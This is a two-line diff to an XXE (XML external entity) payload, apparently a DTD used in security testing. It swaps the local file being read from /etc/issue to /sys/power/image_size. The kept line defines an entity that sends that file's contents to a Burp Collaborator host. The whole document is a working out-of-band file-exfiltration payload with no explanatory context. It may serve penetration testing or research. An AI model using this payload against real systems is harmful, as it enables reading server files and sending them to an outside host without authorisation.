@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "file:///etc/issue">
+<!ENTITY % data SYSTEM "file:///sys/power/image_size">
 <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'https://jwjb41dvpkkx121lt1yahxy0orunic.burpcollaborator.net/?%data;'>">
